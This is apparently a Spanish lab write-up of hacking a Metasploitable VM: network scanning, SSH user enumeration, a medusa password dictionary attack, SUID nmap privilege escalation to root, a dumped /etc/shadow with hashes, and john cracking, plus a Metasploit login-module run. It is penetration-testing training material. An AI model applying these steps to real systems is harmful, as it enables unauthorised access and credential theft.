# METAESPLOITABLE 1
## METODO 1
descubrimiento de la red

```
ifconfig
```

![alt text](https://github.com/raresroy/Metasploitable1/blob/main/imagen_2025-05-28_005024879.png)

>red: 192.168.30.0/24

descubrimiento de la ip del metasploitable

```
nmap -sn 192.168.30.0/24
```

![alt text](https://github.com/raresroy/Metasploitable1/blob/main/imagen_2025-05-28_010415201.png)

>Metasploitable: 192.168.30.130/24

identificamos los servicios y versiones que corren en todos los puertos

```
nmap -sV 192.168.30.130 -p-
```

![alt text](https://github.com/raresroy/Metasploitable1/blob/main/imagen_2025-05-28_012113513.png)

>22/tcp    open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)

buscamos exploits relacionados a ese servicio

```
nmap -sV -p22 192.168.30.130 -oA results.txt
ls results.txt.*
searchsploit -x --nmap results.txt.xml
```

![alt text](https://github.com/raresroy/Metasploitable1/blob/main/imagen_2025-05-28_013715856.png)

>OpenSSH 2.3 < 7.7 - Username Enumeration 

buscamos un exploit para esa vulnerabilidad en la red:
[ssh-enum.py](https://github.com/rberrospit/UNI-CBN04/blob/main/ssh-enum.py)

recuperamos el recurso

```
wget https://raw.githubusercontent.com/rberrospit/UNI-CBN04/refs/heads/main/ssh-enum.py?token=GHSAT0AAAAAADBMMK3NWUWIFVUYNQNJ7LLO2BXCDQA
cp ssh-enum.py\?token=GHSAT0AAAAAADBMMK3NWUWIFVUYNQNJ7LLO2BXCDQA ssh-enum.py
rm ssh-enum.py\?token=GHSAT0AAAAAADBMMK3NWUWIFVUYNQNJ7LLO2BXCDQA 
```

creamos un entorno virtual para la correcta ejecucion del ssh-enum.py

```
python3 -m venv venv
source venv/bin/activate
pip install paramiko==2.11.0
```

usamos ssh-enum.py y guardamos todo en usuarios.txt
```
python ssh-enum.py -t 10 -w /usr/share/metasploit-framework/data/wordlists/unix_users.txt 192.168.30.130 > usuarios.txt
```

![alt text](https://github.com/raresroy/Metasploitable1/blob/main/imagen_2025-05-28_084635563.png)

filtramos solo nombre de usuario de usuarios.txt

```
grep "found\!" usuarios.txt > logs.txt
awk '{print $2}' logs.txt > users.txt 
rm usuarios.txt 
rm logs.txt
```

guardamos en ssh-user.txt el usuario al cual hallaremos su password usando ataque de diccionario

```
echo "user" > ssh-user.txt
```

buscamos un diccionario en la red:
[unix_users.txt](https://github.com/rapid7/metasploit-framework/blob/master/data/wordlists/unix_users.txt)

recuperamos el recurso

```
wget https://raw.githubusercontent.com/rapid7/metasploit-framework/refs/heads/master/data/wordlists/unix_users.txt 
```

ataque de diccionario

```
medusa -U ssh-user.txt -P unix_users.txt -h 192.168.30.130 -M ssh
```

![alt text](https://github.com/raresroy/Metasploitable1/blob/main/imagen_2025-05-28_090558717.png)

>usuario: user

>password: user

hacemos la conexion ssh con el metasploitable

```
ssh -o HostKeyAlgorithms=+ssh-rsa user@192.168.30.130
```

![alt text](https://github.com/raresroy/Metasploitable1/blob/main/imagen_2025-05-28_090929626.png)

escalamos privilegios

```
find / -perm -4000 -type f 2>/dev/null
nmap --interactive
```

![alt text](https://github.com/raresroy/Metasploitable1/blob/main/imagen_2025-05-28_100643722.png)


```
!sh
cat /etc/passwd
cat /etc/shadow
```

![alt text](https://github.com/raresroy/Metasploitable1/blob/main/imagen_2025-05-28_100826936.png)

lista de todos los usuarios

```
root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
daemon:*:14684:0:99999:7:::
bin:*:14684:0:99999:7:::
sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:14742:0:99999:7:::
sync:*:14684:0:99999:7:::
games:*:14684:0:99999:7:::
man:*:14684:0:99999:7:::
lp:*:14684:0:99999:7:::
mail:*:14684:0:99999:7:::
news:*:14684:0:99999:7:::
uucp:*:14684:0:99999:7:::
proxy:*:14684:0:99999:7:::
www-data:*:14684:0:99999:7:::
backup:*:14684:0:99999:7:::
list:*:14684:0:99999:7:::
irc:*:14684:0:99999:7:::
gnats:*:14684:0:99999:7:::
nobody:*:14684:0:99999:7:::
libuuid:!:14684:0:99999:7:::
dhcp:*:14684:0:99999:7:::
syslog:*:14684:0:99999:7:::
klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:14742:0:99999:7:::
sshd:*:14684:0:99999:7:::
msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:14684:0:99999:7:::
bind:*:14685:0:99999:7:::
postfix:*:14685:0:99999:7:::
ftp:*:14685:0:99999:7:::
postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:14685:0:99999:7:::
mysql:!:14685:0:99999:7:::
tomcat55:*:14691:0:99999:7:::
distccd:*:14698:0:99999:7:::
user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:14699:0:99999:7:::
service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:14715:0:99999:7:::
telnetd:*:14715:0:99999:7:::
proftpd:!:14727:0:99999:7:::
statd:*:15474:0:99999:7:::
snmp:*:15480:0:99999:7:::
```

contraseñas crackeadas usando john

```
john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
```

![alt text](https://github.com/raresroy/Metasploitable1/blob/main/imagen_2025-05-28_125011621.png)

## METODO 2

```
msfconsole
```

![alt text](https://github.com/raresroy/Metasploitable1/blob/main/imagen_2025-05-28_112139906.png)

```
use 75
set RHOSTS 192.168.30.130
set USER_FILE ./userssh.txt
set PASS_FILE ./unix_users.txt
run
```
>192.168.30.130:22 - Success: 'user:user' 'uid=1001(user) gid=1001(user) groups=1001(user) Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux '

![alt text](https://github.com/raresroy/Metasploitable1/blob/main/imagen_2025-05-28_114655729.png)
